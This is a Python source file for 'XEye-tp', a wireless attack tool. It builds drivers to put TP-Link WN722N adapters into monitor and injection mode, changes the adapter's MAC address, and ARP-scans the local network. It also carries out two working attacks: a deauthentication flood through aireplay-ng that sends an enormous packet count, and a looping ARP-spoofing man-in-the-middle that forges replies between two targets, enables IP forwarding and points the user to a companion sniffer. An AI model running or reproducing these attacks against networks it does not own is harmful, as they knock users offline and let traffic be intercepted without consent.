#! /usr/bin/env python3
# XEye-tp is only developed by Mostafa Ahmad, The Cybersecurity Expert and Senior Penetration Tester
import subprocess, os, re, time
import scapy.all as sc
def udte():
    print("\n[Info] --> The XEye-tp tool will check for its updates, please wait .....\n\n")
    time.sleep(1)
    chupd = subprocess.check_output(['git','pull'])
    chked = re.search(r"Already up to date", str(chupd))
    chkeds = re.search(r"actualizado", str(chupd))
    bupted = re.search(r"changed,", str(chupd))
    if chked or chkeds:
        #print("\n[Congrats] --> the tool is "+str(chked[0].lower()))
        print("\n[Congrats] --> The XEye-tp tool on your PC is already up to date")
        time.sleep(1)
        Start()
    else:
        print("\n[Info] --> The XEye-tp tool will be updated, please wait ...... \n")
        time.sleep(3)
        if bupted:
            print("\n[Congrats] --> XEye-tp on your machine is updated. Now bugs are fixed and more features added ")
            time.sleep(1)
            print("[Instruction] --> Please rerun XEye-tp so the updates will take effect.   Exiting ........")
            time.sleep(1)
            exit()
        else:
            print("\n[Warning] --> The tool couldn't be updated, please try again or reclone the tool by following the next instructions \n")
            time.sleep(3)
            print("\n[Instruction] --> Remove the \"XEye-tp\" folder by going up one directory and by running this command \"cd ..\" ")
            print("\n[Instruction] -->  then run this cmd \"rm -rf XEye-tp\" to remove the XEye-tp folder ")
            print("\n[Instruction] --> Run this command \"git clone https://github.com/Engmostafa26/XEye-tp.git\" ")
            print(" [Assistance] --> If you need any further assistance, please contact us on our Facebook page: https://facebook.com/XEyecs")
            exit()
def Checkroot():
    who = subprocess.check_output('whoami')
    chuser = re.search(r"root", str(who))
    if chuser:
        verifywus = input("\n [Verifying] --> The XEye-tp tool needs to run with root user not only running with \"sudo\". Are you running your shell as root? [yes / no] " )
        if verifywus.lower() == 'y' or verifywus.lower() == 'yes':
            udte()
        elif verifywus.lower() == 'n' or verifywus.lower() == 'no':
            print(" [Instruction] --> Please run \"sudo su\" command, enter the password for the current user to change to root with the pwd, then run the tool again :) \n")
        else:
            invalid()
    else:
        print("\n\n [Warning] --> You are not root - Please read and follow the instructions below: \n ")
        print("\n [Instruction] --> 1- Please run the XEye-tp tool with root user not only with \"sudo\" to configure your adapter with no issues. ")
        print(" [Instruction] --> 2- Run \"sudo su\" command then enter the password for the current user to change to root with the pwd, then run the tool again :) \n")
def Start():
    print("\n\n******XEye******XEye******XEye******XEye******XEye******XEye******XEye******XEye******XEye******XEye******XEye******XEye******XEye******XEye******\n")
    print("\n\n\t\t\t\t\t\t\t\t [Welcoming] --> Welcome to XEye-tp :) ")
    print("\n\n\t\tThe tool provided to you with love by XEye Cybercecurity company and developed by ENG.Mostafa Ahmad \n\n")
    print("\tWe happily invite you to subscribe to our YT channel through this link \"https://www.youtube.com/c/XEyecs\" to help you in learning Ethical Hacking :)")
    time.sleep(1)
    print("\n\n [Info] --> With XEye-tp tool, you can do the following: \n")
    print(" \t[*] --> 1) Change your WiFi USB adapter TP-Link model WN722N v2 and v3 to Monitor and Injection mode easily and in few minutes or even seconds ")
    print(" \t[*] --> 2) You can easily change the Mac address after your TP-Link WiFi USB is set to monitor mode directly through the tool ")
    print(" \t[*] --> 3) Scan the network and get all the devices Mac addresses easily if the Adapter is connected to that network ")
    print(" \t[*] --> 4) You can perform Deauthintication attack ")
    print(" \t[*] --> 5) You can perform ARP spoofing attack ")
    time.sleep(3)
    Intf = getinterf()
    #print("\n\n[Info] --> A TP-Link USB WIFI adapter is detected \n\n")
    ifconfig_outp = subprocess.getoutput("iwconfig "+Intf)
    chwlan = re.search(r"Mode:Managed", str(ifconfig_outp))
    chwlann = re.search(r"Mode:Auto", str(ifconfig_outp))
    chwlannn = re.search(r"Mode:Monitor", str(ifconfig_outp))
    chifasso = re.search(r"unassociated", str(ifconfig_outp))
    if chwlannn:
        lines()
        print("\n [Info] --> Your WiFi TP-Link USB adapter is already set to Monitor mode ")
        Asking = input("\n [Mac Changer] --> Would like to change your adapter Mac address? [yes / no] ")
        lines()
        if Asking.lower() == 'y' or Asking.lower() == 'yes':
            Usermd()
        elif Asking.lower() == 'n' or Asking.lower() == 'no':
            lines()
            askingg = input("\n [Deauth Attack] Would you like to perform deauthentication attack? [yes / no] ")
            if askingg.lower() == 'y' or askingg.lower() == 'yes':
                deauth()
            elif askingg.lower() == 'n' or askingg.lower() == 'no':
                defau = input("\n [Reset] --> If you want to reset your adapter, you just need to reboot your OS - Reboot now? [yes/no] ")
                if defau.lower() == 'yes' or defau.lower() == 'y':
                    print("\n [Attention] --> We are rebooting your OS in 20 seconds, you can cancel by pressing on the left \"ctrl+c\" ")
                    time.sleep(20)
                    subprocess.call("sudo reboot", shell=True)
                elif defau.lower() == 'no' or defau.lower() == 'n':
                    print("\n [*] --> Thanks for using XEye-tp tool, Your Adapter is just set to Monitor mode - Bye bye .....\n")
                    TheEnd()
                else:
                    invalid()
            else:
              invalid()  
        else:
            invalid()
    elif chwlann:
        lines()
        print("\n [Info] --> Your WiFi USB adapter is already set to Auto mode ")
        asking = input(" [Permission] --> Would you like to set your WiFi USB adapter to \"Monitor mode now\" or \"reconfigure\"?  [set / reconf] ")
        lines()
        if asking.lower() == 'set':
           print("[*] --> Please wait ...... ")
           tp_set()
        elif asking.lower() == 'reconf':
           tp_conf()
        else:
           lines()
           print(" [Warning] --> Invalid Entry. [Your interface is just set to Auto mode]   Exiting .....")
           lines()
           exit()
    elif chifasso is None:
        print( " [Info] --> Your adapter \""+Intf+"\" is connected to a network. ")
        time.sleep(2)
        print(" [Assistance] --> If you need any further assistance, please contact us on our Facebook page: https://facebook.com/XEyecs")
        time.sleep(2)
        asking = input("\n [Permission] --> Would you like to grab the mac addresses of the devices on the network? [yes/no] ")
        if asking.lower() == 'y' or asking.lower() == 'yes':
            interct()
        elif asking.lower() == 'n' or asking.lower() == 'no':
           print(" [Required] --> Please disconnect from the WiFi network then run the tool again to configure your adapter to Monitor mode - Bye bye :)  ")
           print(" [Assistance] --> If you need any further assistance, please contact us on our Facebook page: https://facebook.com/xEyecs")
        else:
          invalid()
    elif chwlan:
        usermd()
def usermd():
    lines()
    sque= input("\n [Permission] --> Would you like to proceed? [yes / no] ")
    lines()
    if sque.lower() == 'y' or sque.lower() == 'yes':
        tp_conf()
    elif sque.lower() == 'n' or sque.lower() == 'no':
        lines()
        print("\n [*] --> Thanks for using XEye-tp tool, Exiting .....\n")
        TheEnd()
    else:
        invalid()

def tp_conf():
    print("\n [*] --> Updating your system, please wait ....  \n")
    lines()
    subprocess.call(['apt', 'update', '-y'], stdout=subprocess.DEVNULL)
    lines()
    print("\n [*] --> Installing build-essentials, Please wait ....  \n")
    lines()
    subprocess.call(['apt', 'install', 'build-essential', '-y'], stdout=subprocess.DEVNULL)
    lines()
    print("\n [*] --> Installing bc, Won't take too long :) ....  \n")
    lines()
    subprocess.call(['apt', 'install', 'bc', '-y'], stdout=subprocess.DEVNULL)
    lines()
    print("\n [*] --> Removing \"r8188eu.ko module\"  \n")
    subprocess.call(['rmmod', 'r8188eu.ko'], stdout=subprocess.DEVNULL)
    lines()
    print("\n [*] --> Installing libelf-dev, Please wait ....  \n")
    lines()
    subprocess.call(['apt', 'install', 'libelf-dev', '-y'], stdout=subprocess.DEVNULL)
    lines()
    print("\n [*] --> Installing dkms, please wait ..... ")
    #print(" [Info] --> If dkms installation timed out after 90 seconds, the tool would exit with error and you need to upgrade your Kali with the \"sudo apt upgrade -y\" CL \n")
    subprocess.call(['sudo','apt', 'install', 'dkms', '-y'], stdout=subprocess.DEVNULL)
    lines()
    print("\n [*] --> Done installing dkms. proceeding further ....  \n")
    lines()
    print("\n [*] --> Installing the required linux-headers, Please wait .....  \n")
    lines()
    subprocess.call("apt install linux-headers-$(uname -r)", shell=True)
    lines()
    print("\n [*] --> Git cloning \"rtl8188eus\"  \n")
    lines()
    unamer = subprocess.check_output(['uname','-r'])
    unamerr = re.search(r"\d.\d\d", str(unamer))
    if unamerr is None:
        subprocess.call(['git', 'clone', 'https://github.com/aircrack-ng/rtl8188eus'], stdout=subprocess.DEVNULL)
        os.chdir("rtl8188eus")
        lines()
        print("\n [*] --> Echoing \"blacklist r8188eu.ko\" to \"realtek.conf\"  \n")
        subprocess.call("echo \"blacklist r8188eu.ko\" > \"/etc/modprobe.d/realtek.conf\"", shell=True)
        #subprocess.call("echo \"blacklist 8188eu.ko\" > \"/etc/modprobe.d/realtek.conf\"", shell=True)
    elif unamerr.group(0) >= "5.15":
        subprocess.call(['git', 'clone', 'https://github.com/drygdryg/rtl8188eus.git'], stdout=subprocess.DEVNULL)
        os.chdir("rtl8188eus")
        #subprocess.call("echo \'blacklist r8188eu\'|sudo tee -a \'/etc/modprobe.d/realtek.conf\'", shell=True)
        subprocess.call("echo \"blacklist r8188eu\" > \"/etc/modprobe.d/realtek.conf\"", shell=True)
    else:
        subprocess.call(['git', 'clone', 'https://github.com/aircrack-ng/rtl8188eus'], stdout=subprocess.DEVNULL)
        os.chdir("rtl8188eus")
        lines()
        print("\n [*] --> Echoing \"blacklist r8188eu.ko\" to \"realtek.conf\"  \n")
        subprocess.call("echo \"blacklist r8188eu.ko\" > \"/etc/modprobe.d/realtek.conf\"", shell=True)
        subprocess.call("echo \"blacklist 8188eu.ko\" > \"/etc/modprobe.d/realtek.conf\"", shell=True)    
    lines()
    print("\n [*] --> Running Make command, Will take few minutes, please wait and ignore the upcoming errors and warnings ......  \n")
    lines()
    subprocess.call(['make'], stdout=subprocess.DEVNULL)
    lines()
    print("\n [*] --> Running Make Install command  \n")
    time.sleep(0.5)
    lines()
    subprocess.call(['make', 'install'], stdout=subprocess.DEVNULL)
    lines()
    print("\n [*] --> Running \"modprobe 8188eu\"  \n")
    time.sleep(1)
    lines()
    subprocess.call("modprobe 8188eu", shell=True)
    time.sleep(3)
    iwco = subprocess.check_output(['iwconfig'])
    Auto_check = re.search(r"Mode:Auto", str(iwco))
    if not Auto_check:
        lines()
        print("\n [Warning] --> The WiFi adapter mode is not Auto or it is just missing, don't worry just follow the next instruction to bypass the restriction ")
        print("\n [Info] --> It is normal to see such warnings from time to time as we are bypassing the restrictions on your adapter. ") 
        print(" [Instruction] --> UnPlug and plug in your WiFi USB adapter, WAIT FOR FEW SECONDS then run the tool again and XEye-tp will do the rest :)   \n")
        print(" [Assistance] --> If you need any further assistance, please contact us on our Facebook page: https://facebook.com/xEyecs")
        lines()
        exit()
    if Auto_check is not None:
        lines()
        print("\n [Congrats] --> The WiFi USB adapter is successfully configured \n")
        asking = input("\n [Permission] --> Would you like to set your WiFi USB adapter to Monitor mode now?  [yes / no] ")
        lines()
        if asking.lower() == 'y' or asking.lower() == 'yes':
            tp_set()
        elif asking.lower() == 'n' or asking.lower() == 'no':
            lines()
            print("\n [Info] --> Now your adapter is just set to Auto mode - Bye Bye :) \n")
            TheEnd()
        else:
            lines()
            print("\n [Warning] --> Invalid Entry. [Your interface is just set to Auto mode] - Exiting .....\n")
            exit()
def tp_set():
    interf = getinterf()
    subprocess.call(['sudo','ifconfig', interf, 'down'])
    time.sleep(1)
    subprocess.call("sudo airmon-ng check kill", shell=True)
    time.sleep(1)
    subprocess.call(['sudo','iwconfig', interf, 'mode', 'monitor'])
    subprocess.call(['sudo','ifconfig', interf, 'up'])
    time.sleep(1)
    tp_check()
def tp_check():
    interff = getinterf()
    iwcon = subprocess.getoutput("iwconfig "+interff)
    iwcon_Mcheck = re.search(r"Mode:Monitor",str(iwcon))
    if iwcon_Mcheck is not None:
        lines()
        print("\n [Congrats] --> You WiFi USB adapter has been set to monitor mode :) :) \n")
        Asking = input("\n [Asking] --> Would like to change your WiFi adapter Mac address? [yes / no] ")
        if Asking.lower() == 'y' or Asking.lower() == 'yes':
            Usermd()
        elif Asking.lower() == 'n' or Asking.lower() == 'no':
            askingg = input("\n [Deauth Attack] Would you like to perform deauthentication attack? [yes / no] ")
            if askingg.lower() == 'y' or askingg.lower() == 'yes':
                deauth()
            elif askingg.lower() == 'n' or askingg.lower() == 'no':
                lines()
                print("\n [*] --> Thanks for using XEye-tp tool, Your WiFi Adapter \""+interff+"\" is just set to Monitor mode - Bye bye :) .....\n")
                TheEnd()
            else:
              invalid()  
        else:
            invalid()
    else:
        lines()
        print("\n [Failure] --> Sorry :( , your WiFi USB could not be changed to monitor mode ")
        print("\n [Instruction] --> 1) Run the tool again because it might be a technical issue was on your system. ")
        print("\n [Instruction] --> 2) If the issue persists, simply upgrade and restart your system then run the tool again :) ")
        print("\n [Instruction] --> 3) To upgrade your system, just run this command \"sudo apt upgrade -y\" \n ")
        print(" [Assistance] --> If you need any further assistance, please contact us on our Facebook page: https://facebook.com/xEyecs")
        exit()
def Usermd():
    Interface = getinterf()
    lines()
    Mac = input("\n        [Required] --> Enter the required Mac address: ")
    if not Mac:
        print(" \n [Warning] --> No Mac address specified. ")
        print(" \n [Info] Now your adapter is just set to monitor mode - Bye bye .....")
        TheEnd()
    Macc1 = getmac(Interface)
    if Macc1 == Mac:
        print(" \n [Info] --> You just entered the same Mac address for " + Interface + ", please enter a different Mac address - Exiting ...... ")
        exit()
    ChMac(Interface, Mac)
    Macc2 = getmac(Interface)
    if (Macc2 == Mac) or (Macc1 != Macc2):
        print(" [Done] --> The Mac address is changed successfully to " + Mac)
        TheEnd()
    else:
        print(" [Warning] --> Something Went wrong, The Mac address couldn't change to "+Mac)
        print("\n [Instruction] --> Enter a valid Mac address, or unplug then plug in you adapter, wait for few seconds then run the tool again - Bye bye :) ")
        print(" [Assistance] --> If you need any further assistance, please contact us on our Facebook page: https://facebook.com/xEyecs")
        exit()

def ChMac(Interface,Mac):
    lines()
    print("\n [Info] --> XEye-tp is setting your " + Interface + " Mac address to " + Mac)
    lines()
    subprocess.call(["ifconfig", Interface, "down"])
    subprocess.call(["iwconfig", Interface, "mode", "Auto"])
    subprocess.call(["ifconfig", Interface, "hw", "ether", Mac])
    subprocess.call(["iwconfig", Interface, "mode", "Monitor"])
    subprocess.call(["ifconfig", Interface, "up"])

def getinterf():
    interfs = subprocess.getoutput('iwconfig |grep WIFI@REALTEK')
    interfso = subprocess.getoutput('iwconfig |grep Access Point')
    intero = re.search(r"\w\w\w\w\d", str(interfso))
    interoo = re.search(r"\w\w\w\d", str(interfso))
    interf = re.search(r"\w\w\w\w\d", str(interfs))
    interff = re.search(r"\w\w\w\d", str(interfs))
    enforc = re.search(r"WIFI@REALTEK", str(interfs))
    if interf and enforc:
        print("[Info] --> A TP-Link USB WIFI adapter is detected ")
        return interf.group(0)
    elif interff and enforc:
        print("[Info] --> A TP-Link USB WIFI adapter is detected ")
        return interff.group(0)
    elif intero:
        asko = input("[Info] --> The WiFi interface "+intero+" is detected which is not TP-Link WN722N, Would you like to proceed? ")
        if asko.lower() == 'y' or asko.lower() == 'yes':
            return intero.group(0)
        elif asko.lower() == 'n' or asko.lower() == 'no':
            print("[Info] --> Non of your adapters changed to Monitor mode by XEye-tp - Exiting ......")
            exit()
        else:
            invalid()
    elif interoo:
        asko = input("[Info] --> The WiFi interface "+interoo+" is detected which is not TP-Link WN722N, Would you like to proceed? ")
        if asko.lower() == 'y' or asko.lower() == 'yes':
            return interoo.group(0)
        elif asko.lower() == 'n' or asko.lower() == 'no':
            print("[Info] --> Non of your adapters changed to Monitor mode by XEye-tp - Exiting ......")
            exit()
        else:
            invalid()
    else:
        lines()
        print(" [Warning] --> Couldn't detect a WiFi Adapter - please wait .......")
        lsub = subprocess.getoutput('lsusb |grep TL-WN722N')
        lsubs = re.search(r"TL-WN722N", str(lsub))
        time.sleep(2)
        if lsubs:
            print("\n [info] --> The TP-Link WN722N adapter is attached, but it is still not seen as a WiFi adapter. Don't worry we will configure everything for you ......")
            #subprocess.call(['sudo','apt', 'install', 'dkms', '-y'], stdout=subprocess.DEVNULL)
            #print("\n [Instruction] --> The dkms installation is finished, now your system needs to reboot so your adapter will be seen as a WiFi adapter .....")
            rebo = input("\n [Permission] --> Would you like to proceed? [yes/no] ")
            if rebo.lower() == 'yes' or rebo.lower() == 'y':
                tp_conf()
                #subprocess.call("reboot", shell=True)
            if rebo.lower() == 'no' or rebo.lower() == 'n':
                print("\n [Info] --> Thanks for using XEye-tp - Exiting ..... ")
                time.sleep(2)
                exit()
            else:
                 invalid()
        else:
            print(" [Warning] --> Your TP-WN722N adapted is not seen by your system, please make sure that it is attached")
            print(" [Assistance] --> If you need any further assistance, please contact us on our Facebook page: https://facebook.com/xEyecs")
            exit()
def getmac(interface):
    ifconfgi_re = subprocess.check_output(["ifconfig", interface])
    testing1 = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(ifconfgi_re))
    testing2 = re.search(r"\w\w-\w\w-\w\w-\w\w-\w\w-\w\w", str(ifconfgi_re))
    if testing1:
        return testing1.group(0)
    elif testing2:
        mvalue = testing2.group(0)
        Mvalue = re.sub('-',':',mvalue)
        return Mvalue
    else:
        lines()
        print("\n [Warning] --> Please make sure that your adapter is plugged in, then run the tool again and use the set option. - Exiting ..... ")
        time.sleep(2)
        print(" [Assistance] --> If you need any further assistance, please contact us on our Facebook page: https://facebook.com/xEyecs")
        exit()
def interct():
    ipp = subprocess.getoutput("ip r |grep "+getinterf())
    ipr = subprocess.getoutput(ipp+" | grep proto | cut -d\" \" -f1")
    ip = re.search(r"(?:\d{1,3}\.){3}\d{1,3}(?:/\d\d?)?", str(ipr))
    if ip is not None:
        print(" [Info] --> Scanning your network \"" + ip.group(0) + "\", please wait ......")
        scanning(ip.group(0))
    else:
        print(" [Warning] --> The adapter might be disconnected from the network. Please try again - Exiting ..... ")
        time.sleep(2)
        print(" [Assistance] --> If you need any further assistance, please contact us on our Facebook page: https://facebook.com/XEyecs")
        exit()
def scanning(ip):
    target = sc.ARP(pdst=ip)
    destmac = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
    comb = destmac/target
    gotten = sc.srp(comb,timeout=7,verbose=False)[0]
    ips = []
    for el in gotten:
        gottenips = {"ips":el[1].psrc,"mac":el[1].hwsrc}
        ips.append(gottenips)
        #print("---------------------------------------------------------")
    printr(ips)
def printr(ipss):
    print("\n The IP \t\t The Mac Address\n ---------------------------------------------------------")
    for nn in ipss:
        print(nn["ips"]+"\t\t"+nn["mac"])
    time.sleep(2)
    askii = input("\n\n [Asking] --> Would you like to start ARP spoofing attack? ")
    if askii.lower() == 'y' or askii.lower() == 'yes':
        subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward",shell=True)
        time.sleep(1)
        arpspoof()
    elif askii.lower() == 'n' or askii.lower() == 'no':
        time.sleep(1)
        TheEnd()
    else:
        invalid()
def arpspoof():
    ipo = input("[Required] --> The first target's IP: ")
    iptw = input("[Required] --> The second target's IP: ")
    print("\n[Recommended] --> Clone the XEye-sn sniffer tool through this link \"https://github.com/Engmostafa26/XEye-sn.git\" \n")
    time.sleep(1)
    mact = getm(ipo)
    mactt = getm(iptw)
    integ = 2
    print("[Info] --> ARP Spoofing attack is started ....")
    time.sleep(1)
    print("[Instruction] --> To stop the attack and restore all the targets ARP tables, press on the left \"ctrl+c\" once or more if needed")
    try:
        while True:
            spoofing(ipo, iptw, mact)
            time.sleep(1)
            spoofing(iptw, ipo, mactt)
            print("\r ARP Spoofing packets sent: "+str(integ), end="")
            integ += 2
            time.sleep(1)
    except:
        print("\n\n[Info] --> The attack is stopped, and all the ARP tables will be restored - please wait ....")
        #mact = getm(ipo)
        #macs = getm(iptw)
        packetre = sc.ARP(op=2,hwdst=mact,pdst=ipo,psrc=iptw,hwsrc=mactt)
        sc.send(packetre,verbose=False,count=3)
        packetree = sc.ARP(op=2,hwdst=mactt,pdst=iptw,psrc=ipo,hwsrc=mact)
        sc.send(packetree, verbose=False, count=3)
        subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward",shell=True)
        print("[Info] --> All the ARP tables of the targets are restored ")
        time.sleep(2)
        exit()


def getm(ip):
    targetn = sc.ARP(pdst=ip)
    targeth = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
    comb = targeth/targetn
    anss = sc.srp(comb,verbose=False,timeout=3)[0]
    return anss[0][1].hwsrc
def spoofing(ipt, ips, macc):
    #mact = getm(ipt)
    #print(mact)
    spacket = sc.ARP(op=2,pdst=ipt,psrc=ips,hwdst=macc)
    sc.send(spacket,count=2,verbose=False)

def invalid():
    lines()
    print(" [warning] --> Invalid entry, please use a yes or no answer, Exiting .....")
    lines()
    exit()
def deauth():
    Intff = getinterf()
    print("\n [Instruction] --> You need to run \"airodump-ng\" against the targeted network - Your adapter interface name is "+Intff)
    print("\n [Recommendation] --> watch this video \"https://www.youtube.com/watch?v=hiry2h-jB0c\" to know how to use \"airodump-ng\" ")
    dumby = input("\n [Waiting] --> Enter any value and press Enter when you are ready: ")
    if dumby:
        routmac = input(" [Required] --> Please enter the Mac address of the target's access point(router): ")
        climac = input(" [Required] --> Please enter the Mac address of the target's device: ")
        print("\n [Instrucion] --> Make sure that \"airodump-ng\" against the network is running ")
        dumbi = input("\n [Waiting] --> Enter any value and press Enter when you are ready: ")
        if dumbi:
            #packno = input(" [Required] --> Please enter the number of the deauthentication packets to be sent to the target: ")
            print("\n [Info] --> the attack is in action, if you want to stop the attack please press on the left \"ctrl+c\" buttons \n\n\n")
            time.sleep(2)
            subprocess.call(['sudo', 'aireplay-ng', '--deauth', '100000000000000' ,'-a', routmac ,'-c', climac , Intff])
def lines():
    print("-------------------------------------------------------------------------------------------------------")
def TheEnd():
    lines()
    time.sleep(2)
    print("\n [Recommendation] --> Run the \"exit\" command to exit the root shell, and stay secure :) ")
    time.sleep(3)
    print("\n*******************************************************************************************************")
    print("\t\t\t\t[*] Thanks for using XEye-tp. Below are our Social Media OSINT Hacking bundle recommended for you :) [*]")
    print("\n [***] --> The Ultimate Social Media OSINT Hacking Bundle(70% OFF): https://rb.gy/sgxib8")
    print("*******************************************************************************************************")
    print("\n [Author] Eng.Mostafa Ahmad - Cybersecurity Expert and \"XEye\" founder.")
    exit()
Checkroot()
